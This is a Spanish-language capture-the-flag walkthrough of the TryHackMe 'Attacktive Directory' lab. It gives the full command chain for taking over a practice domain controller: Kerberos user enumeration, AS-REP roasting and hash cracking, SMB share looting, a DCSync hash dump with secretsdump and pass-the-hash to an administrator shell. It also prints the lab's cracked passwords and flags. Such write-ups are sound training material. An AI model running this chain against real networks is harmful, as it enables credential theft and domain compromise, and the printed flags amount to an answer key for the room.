# Attacktive Directory – TryHackMe (Walkthrough)

## 🧭 Introducción
**Attacktive Directory** es una sala práctica centrada en comprometer un **Domain Controller** de Active Directory: desde la fase de descubrimiento y enumeración (Kerberos/SMB) hasta el abuso de configuraciones débiles para obtener credenciales y, finalmente, el control del dominio. El reto propone si puedes **explotar un controlador de dominio vulnerable** y guía por las técnicas clave para lograrlo.

---

## 🗂️ Estructura del write-up

Iré documentando **paso a paso** con comandos, salida relevante, explicación y pequeñas conclusiones operativas para enlazar con el siguiente movimiento. Las información de las respuestas a las preguntas contestadas derivan de los pasos siguientes.

---

## Paso 1 — Comprobación de conectividad (ICMP)

**Captura**

<img width="613" height="268" alt="Ping" src="https://github.com/user-attachments/assets/24cf8c71-8436-4128-aab1-a527cc2c34fa" />

**Comando usado**
```bash
ping -c 4 10.10.19.151
```
Salida relevante (resumen)

Respuestas ICMP recibidas: 4/4

Pérdida de paquetes: 0%

RTT (min/avg/max): aprox. 48/49/50 ms

TTL=127 en las respuestas

📌 Observación: Un TTL ~127 es típico de Windows (valor inicial 128), lo que sugiere que el host objetivo podría ser un sistema Windows/AD — coherente con la temática de la sala.

Qué nos dice este paso

El objetivo está activo y accesible desde nuestra VPN de THM.

La latencia es estable; podemos continuar con escaneo TCP completo y scripts.


## Paso 2 — Resolución de nombre del dominio (edición de `/etc/hosts`)

**Acción**

Añadimos el FQDN del dominio al archivo de hosts para que las herramientas de AD (Kerberos/LDAP/SMB) resuelvan correctamente el DC:

10.10.19.151 spookysec.local

<img width="895" height="285" alt="Agrego spooky local a hosts" src="https://github.com/user-attachments/assets/65f0136f-5985-457f-812f-ac75736656a8" />


bash

> En Kali/Ubuntu:
```bash
sudo nano /etc/hosts
```

o en una sola línea:
echo "10.10.19.151 spookysec.local" | sudo tee -a /etc/hosts

Motivo
Muchas técnicas de Active Directory (Kerberos/SPN, LDAP, SMB, NTLM) dependen del nombre de dominio o del FQDN del controlador. 

Si no hay DNS en el laboratorio, mapear el FQDN al IP en /etc/hosts evita errores de resolución y tickets Kerberos mal formados.


## Paso 3 — Instalar **Impacket** (herramientas AD/SMB/Kerberos)

**Contexto**
Impacket nos aporta utilidades clave para AD: `GetNPUsers.py`, `GetUserSPNs.py`, `wmiexec.py`, `psexec.py`, `secretsdump.py`, etc.  
En Kali puedes usar el paquete del sistema o instalar desde fuente (recomendado para la versión más reciente).

### Opción A) Desde repos (rápida)
```bash
sudo apt update
sudo apt install -y python3-impacket
# Verifica:
impacket-GetNPUsers -h
```
### Opción B) Desde fuente (recomendada)

1) Clonar
sudo mkdir -p /opt && cd /opt
sudo git clone https://github.com/fortra/impacket.git
sudo chown -R $USER:$USER impacket
cd impacket

2) (Opcional pero recomendado) Entorno virtual
python3 -m venv .venv
source .venv/bin/activate

3) Actualizar tooling de build
python -m pip install --upgrade pip setuptools wheel

4) Instalar dependencias e impacket
pip install -r requirements.txt
# En lugar de 'setup.py install' (deprecado), usa:
pip install .

5) Comprobar binarios
GetNPUsers.py -h
GetUserSPNs.py -h
secretsdump.py -h

Dónde quedan los scripts

Con apt: en /usr/bin/ (prefijo impacket- en algunos binarios).

Con venv: en ./.venv/bin/ (si usaste entorno virtual).

Global con pip: en /usr/local/bin/.


## Paso 4 — Escaneo de servicios con **Nmap** (mapa completo)

**Comando usado**
```bash
nmap -Pn -sV -sT 10.10.19.151 | grep open
```

<img width="1051" height="344" alt="nmap inicial puertos serivcios abiertos" src="https://github.com/user-attachments/assets/cf00fd8f-0248-49d8-816a-a6d9aa63bc20" />


Puertos/servicios abiertos (según salida)

53/tcp open domain → Simple DNS Plus

80/tcp open http → Microsoft IIS httpd 10.0

88/tcp open kerberos-sec → Microsoft Kerberos

135/tcp open msrpc → Microsoft Windows RPC

139/tcp open netbios-ssn

389/tcp open ldap → Microsoft Active Directory LDAP (Domain: spookysec.local)

445/tcp open microsoft-ds → SMB

464/tcp open kpasswd5 → Kerberos password change

593/tcp open ncacn_http → MS RPC over HTTP 1.0 (Outlook/Exchange/AD FS escenarios)

636/tcp open ldaps → LDAP sobre TLS

3268/tcp open ldap → Global Catalog (LDAP)

3269/tcp open tcpwrapped → Global Catalog (LDAPS)

3389/tcp open ms-wbt-server → RDP

5985/tcp open http → WinRM (PowerShell Remoting)

### Lectura táctica

Tenemos un Domain Controller plenamente expuesto (Kerberos, LDAP/LDAPS, GC, SMB, RPC, DNS, RDP y WinRM).

Vías de ataque probables:

Kerberos: AS-REP Roasting / Kerberoasting.

LDAP: enumerar usuarios, grupos y SPNs (si hay bind anónimo o con credenciales débiles).

SMB: listar shares y leer ficheros si hay acceso invitado o credenciales reutilizadas.

DNS: intentar zone transfer si está mal configurado.

HTTP (IIS): recon web básica por si hay paneles o leaks.

WinRM/RDP: útiles cuando ya obtengamos credenciales válidas.


## Paso 5 — Derivar información del **Dominio**

<img width="968" height="601" alt="nmap puertos" src="https://github.com/user-attachments/assets/673b6dad-0f6e-4b40-8645-c0fb8a7f86ff" />


**De la salida de Nmap (imagen anterior) extraemos:**
- `Target_Name` / `NetBIOS_Domain_Name`: **THM-AD**
- `DNS_Domain_Name`: **spookysec.local**
- `DNS_Computer_Name`: **AttacktiveDirectory.spookysec.local**
- `Product_Version`: **Windows Server 2019 (10.0.17763)**
- `SMB 3.1.1` con **signing required**
- *Clock-skew* ≈ 20s (útil para Kerberos)

 A partir de esta información podemos enumerar, realizar ataques de fuerza bruta, etc.


## Paso 6 — Enumeración con **enum4linux** (SMB/RPC anónimo)

**Comando usado**
```bash
enum4linux -a -M -l -d 10.10.19.151
```
o la versión-ng:
enum4linux-ng -A 10.10.19.151

<img width="982" height="569" alt="enum4linux" src="https://github.com/user-attachments/assets/56aeefda-99c3-403d-9188-bec523ffd051" />


Resumen de la salida (captura)

SID del dominio y resolución de RIDs → listado parcial vía RPC:

Usuarios/locales básicos: Administrator, Guest, DefaultAccount, WDAGUtilityAccount

Cuentas/grupos de dominio bien conocidos:

krbtgt

Domain Admins, Domain Users, Domain Guests, Domain Computers, Domain Controllers

Enterprise Admins, Schema Admins, Read-Only Domain Controllers, Protected Users, etc.

Máquina del DC: ATTACKTIVEDIREC$

Acceso a spoolss denegado (NT_STATUS_ACCESS_DENIED).

No aparecen shares navegables de manera anónima.

Lectura táctica

El null session (anónimo) permite algo de RPC SID enumeration, suficiente para confirmar el SID del dominio y la existencia de cuentas/grupos estándar de AD.

Sin embargo, el acceso es limitado: no hay listado de impresoras/compartidos ni información sensible adicional.

Esto es normal en DCs relativamente endurecidos: SMB signing required y políticas que restringen anonymous enumeration.


## Paso 7 — **Enumeración de usuarios válidos** con Kerbrute

**Comando usado**

```bash
kerbrute userenum --dc 10.10.19.151 -d spookysec.local users.txt -o enum/kerbrute_valid_raw.txt
```

<img width="801" height="488" alt="enumeramos Kerbero username" src="https://github.com/user-attachments/assets/11c3612a-afeb-41fe-b50f-807b2af13817" />


Resultado (captura)

KDC: 10.10.19.151:88

Usuarios válidos detectados: 16
Ejemplos en la salida:

james@spookysec.local

svc-admin@spookysec.local

robin@spookysec.local

darkstar@spookysec.local

administrator@spookysec.local

backup@spookysec.local

paradoxo@spookysec.local

ori@spookysec.local

(y variantes con mayúsculas/minúsculas del mismo usuario)

📌 Notas

Kerbrute valida existencia de usuarios en Kerberos sin probar contraseñas, por lo que no bloquea cuentas.


## Paso 8 — **AS-REP Roasting** con `GetNPUsers.py`

**Objetivo**

Comprobar si alguno de los usuarios válidos **no requiere pre-autenticación Kerberos** (flag `DONT_REQUIRE_PREAUTH`).  

Si es así, podemos solicitarle un **AS-REP** y obtener un **hash crackeable** sin conocer su contraseña.

<img width="1151" height="204" alt="Usamos getnpusers para sacar el hash" src="https://github.com/user-attachments/assets/83576c27-0e70-4fd4-8741-9377f9158f0e" />


**Comando usado** (según captura)

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass
```

Resultado

Se devuelve un hash tipo $krb5asrep$23$... para el usuario svc-admin:

📌 Lectura táctica: svc-admin no requiere preautenticación, por lo que el KDC nos entrega un AS-REP directamente. Esto habilita ataque offline (no genera bloqueos de cuenta).


## Paso 9 — **Crack** del hash AS-REP con John the Ripper

**Ficheros**

```bash
# Guardamos el hash obtenido en el paso anterior
cat > hash.txt << 'EOF'
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:03...<hash completo>...
EOF
Cracking con John
````
bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

<img width="1145" height="281" alt="desciframos el hash con john para el usuario" src="https://github.com/user-attachments/assets/b7eb37c7-e369-4795-8261-0deecb7f33ff" />


Resultado (captura)

management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
✅ Credenciales válidas obtenidas

Usuario: svc-admin

Password: management2005


## Paso 10 — Acceso a **SMB** con las credenciales (listar y entrar a shares)

<img width="812" height="338" alt="conectamos a la consola del usuario" src="https://github.com/user-attachments/assets/df175f49-407f-4ecf-9d2d-e6b4c71a5670" />


**Intento 1 (fallido)**
```bash
smbclient -L \\\\10.10.19.151\\ -U spookysec.local\\svc-admin
# NT_STATUS_LOGON_FAILURE
```

Falló por el formato de dominio/realm. En este DC, el logon funciona usando solo el usuario (o especificando -W/-U DOMAIN\user correctamente).

Intento 2 (ok) — Listado de compartidos

```bash
smbclient -L \\\\10.10.19.151\\ -U svc-admin
# ShareName: ADMIN$, backup, C$, IPC$, NETLOGON, SYSVOL
Conexión a un share interesante (ej. backup)
```

```bash
smbclient \\\\10.10.19.151\\backup -U svc-admin
# Password: management2005
# Dentro de la consola de smbclient:
smb: \> ls
```

Objetivo de este paso

Enumerar y exfiltrar ficheros de backup/NETLOGON/SYSVOL que puedan contener credenciales, scripts de logon, Groups.xml, contraseñas en texto/obfus, .bat/.ps1/.vbs, o backups con datos sensibles.


## Paso 11 — Acceso al share **backup** y exfiltración de `backup_credentials.txt`

<img width="768" height="219" alt="entramos al directorio backup" src="https://github.com/user-attachments/assets/ad28e0c2-d990-4f09-ba2c-396056619101" />


**Entramos al compartido `backup` con las credenciales de `svc-admin`:**
```bash
smbclient \\\\10.10.19.151\\backup -U svc-admin
# Password: management2005
```

### Dentro de la consola de smbclient:
smb: \> ls
... aparece:  backup_credentials.txt

smb: \> get backup_credentials.txt
smb: \> exit

Vemos el contenido descargado (parece Base64):

<img width="1131" height="323" alt="otenemos un hashs de el archivo txt" src="https://github.com/user-attachments/assets/58fcc8e1-dd5d-414e-a078-a5562b5bd4be" />

```bash
cat backup_credentials.txt
# Ejemplo: mFja3wQ...<cadena-base64>...NTEzODYw
```

Decodificamos a texto claro:

<img width="679" height="129" alt="desciframos el hash del archivo" src="https://github.com/user-attachments/assets/29904d60-039e-4954-a7d0-114ec5215fcf" />

```bash
cat backup_credentials.txt | base64 -d
```

📌 Resultado: se obtiene un par usuario:contraseña para una cuenta de backup (según tu salida en claro).


## Paso 12 — **DCSync / NTDS dump** con `secretsdump.py` (credenciales de `backup`)

**Contexto**

Del `backup_credentials.txt` (Paso 11) obtuvimos credenciales en claro para la cuenta **backup**.  

Probamos si esa cuenta tiene privilegios que permitan **DCSync** (leer secretos del dominio vía `DRSUAPI`) y así **volcar hashes** de todas las cuentas.

<img width="1256" height="744" alt="ejecutamos scretsdump para obtener uusarios y hashes" src="https://github.com/user-attachments/assets/732ffd20-cdcd-4a06-9298-0d8ad180e94c" />


**Comando usado (según captura)**
```bash
secretsdump.py spookysec.local/backup:'backup2517860'@10.10.19.151 -just-dc
```

### En algunas instalaciones el binario se llama 'impacket-secretsdump'

Resultado

Método usado: DRSUAPI (-just-dc) → no requiere ejecutar nada en el host, solo leer del DC.

Se vuelcan las entradas domain\user:rid:lmhash:nthash:::

Por ejemplo (resumen):

spookysec.local\Administrator:500:...:NTLMHASH...:::

spookysec.local\krbtgt:502:...:NTLMHASH...:::

Usuarios estándar: james, robin, darkstar, backup, svc-admin, etc.

Kerberos keys grabbed: claves AES/DES/RC4 para múltiples cuentas (útiles para forjar tickets si fuera necesario).

✅ Con esto ya tenemos el NT hash del Administrator (y de krbtgt).

Podemos usar Pass-The-Hash para obtener una shell administrativa en el DC.


## Paso 13 — **Pass-the-Hash** y shell remota como **Administrator**

Con el **NTLM hash** del `Administrator` (obtenido en el Paso 12) hacemos PTH con Impacket.

**Comando (PTH con `psexec.py`)**
```bash
# Sustituye <NTLMHASH> por el NT hash del Administrator
psexec.py spookysec.local/Administrator@10.10.19.151 -hashes :<NTLMHASH>
```


## Paso 14 — Recopilación de **flags** desde los escritorios de los usuarios

Con la shell obtenida (Paso 13), navegamos por los perfiles y leemos los archivos de bandera en cada `Desktop`.

**Usuario `svc-admin`**
```cmd
cd C:\Users\svc-admin\Desktop
dir
type user.txt.txt
````
<img width="529" height="343" alt="bandera svc-admin" src="https://github.com/user-attachments/assets/7af154eb-3ece-431e-ba14-92136f70e40f" />

Flag
TryHackMe{K3rb3r0s_Pr3_4uth}

**Usuario `Administrator`**


```cmd
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

<img width="454" height="251" alt="bandera administrador" src="https://github.com/user-attachments/assets/c766a5b8-3446-4f03-89de-d27744ec9942" />


Flag
TryHackMe{4ctiveDirectoryM4st3r}


**Usuario `backup`**

```cmd
cd C:\Users\backup\Desktop
dir
type PrivEsc.txt
```
<img width="447" height="304" alt="bandera backup" src="https://github.com/user-attachments/assets/4cc631f6-a10f-4c40-bfbd-f289de1b3331" />


Flag
TryHackMe{B4ckM3UpSc0tty!}


📌 Con esto validamos compromiso del dominio (usuario estándar de servicio, cuenta de backup con privilegios DCSync y Administrator) y la obtención de todas las banderas requeridas por la sala.





